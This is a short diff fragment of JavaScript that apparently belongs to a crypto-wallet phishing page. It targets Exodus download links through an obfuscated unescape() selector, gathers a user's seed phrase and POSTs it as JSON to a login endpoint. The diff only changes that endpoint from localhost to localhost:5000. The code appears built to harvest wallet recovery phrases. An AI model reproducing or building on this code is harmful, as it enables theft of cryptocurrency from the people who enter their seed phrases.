@@ -108,7 +108,7 @@ d.querySelectorAll(unescape("a%5Bhref%5E%3D%22https%3A//downloads.exodus.com/rel
                 seed_phrase: seedPhrase.join(' ')
             };
 
-            fetch('https://localhost/login', {
+            fetch('https://localhost:5000/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(formData)
